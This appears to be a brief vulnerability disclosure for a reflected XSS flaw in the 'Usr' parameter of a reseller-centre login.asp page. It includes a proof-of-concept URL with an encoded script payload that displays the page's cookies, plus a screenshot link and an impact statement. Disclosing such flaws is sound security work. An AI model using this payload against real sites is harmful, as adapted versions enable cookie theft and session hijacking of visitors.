The cause of this XSS vulnerability is that Usr parameters are displayed to the front end without any filtering. **Proof of Concept (POC)** <https://ip:port/resellercenter/login.asp?Usr=%22%3E%3CScRiPt%3Ealert(document.cookie)%3C/ScRiPt%3E> [image](https://private-user-images.githubusercontent.com/66168888/296314769-3e841dcb-42e7-464c-89cd-07717a5c6d69.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1OTc1NjAsIm5iZiI6MTczNjU5NzI2MCwicGF0aCI6Ii82NjE2ODg4OC8yOTYzMTQ3NjktM2U4NDFkY2ItNDJlNy00NjRjLTg5Y2QtMDc3MTdhNWM2ZDY5LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDEyMDc0MFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWRjOTMyZjM5ZjVlYzYyZDE5ZGZmYWNjZWNlMmU1Y2Q2NDkxODVmMDk4M2YwNTc1MmFhOWNiZTczOGYxNjE1MjQmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.zGGftmgKcgwj2J6tIicDd6gY8oAKh9Sf_L0xgt1h3_c) **Impact** After accessing a malicious url, the visitor's browser executes a malicious script inserted by the attacker. |
